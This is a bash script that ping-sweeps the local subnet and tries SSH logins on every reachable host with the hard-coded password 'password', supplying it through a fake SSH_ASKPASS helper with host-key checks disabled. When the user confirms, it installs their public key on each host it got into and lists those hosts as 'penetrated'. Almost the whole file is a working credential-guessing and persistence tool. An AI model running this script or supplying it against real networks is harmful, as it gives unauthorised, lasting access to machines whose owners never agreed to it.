#!/usr/bin/env bash
# Print the IP adresses that are reachable and unsecure on the network
password='password'
timeout=3

# Create temporary files
reachable=$(mktemp)
getpassword=$(mktemp)
unsecure=$(mktemp)
penetrated=$(mktemp)

# Get your IP address
[[ $(ip --brief addr) =~ UP\ *([^\/]*) ]] && my_ip=${BASH_REMATCH[1]} || exit 1
echo "This computer's IP address: $my_ip"

# Get reachable IP addresses
echo "Reachable IP addresses on the network:"
for ip in $(seq -f "${my_ip%\.*}.%g" 1 254); do
    (ping "$ip" -c 1 -w "$timeout" >/dev/null && echo "$ip" >> "$reachable" &)
done
sleep "$timeout"
cat "$reachable"

# Prepare a program to output the password to ssh
echo "echo '$password'" >> "$getpassword"
chmod +x "$getpassword"
export SSH_ASKPASS="$getpassword" DISPLAY=

# Try to connect to reachable IP addrsses
echo "Unsecure IP addresses on the network:"
while read ip; do
    (setsid ssh \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o NumberOfPasswordPrompts=1 \
        -o ConnectTimeout="$timeout" \
        -q "$ip" exit && echo "$ip" >> "$unsecure" &)
done < "$reachable"
sleep "$timeout"
cat "$unsecure"

# Add your public key to unsecure hosts
read -s -n 1 -p "Add public key to unsecure hosts? (y/N): " answer
echo
if [ "$answer" = "y" ]; then
    echo "Penetrated hosts on the network:"
    while read ip; do
        (setsid ssh-copy-id "$ip" >/dev/null 2>&1 && echo "$ip" >> "$penetrated" &)
    done < "$unsecure"
    sleep "$timeout"
    cat "$penetrated"
fi

# Remove temporary files
rm "$reachable" "$getpassword" "$unsecure" "$penetrated"

echo "Bye."
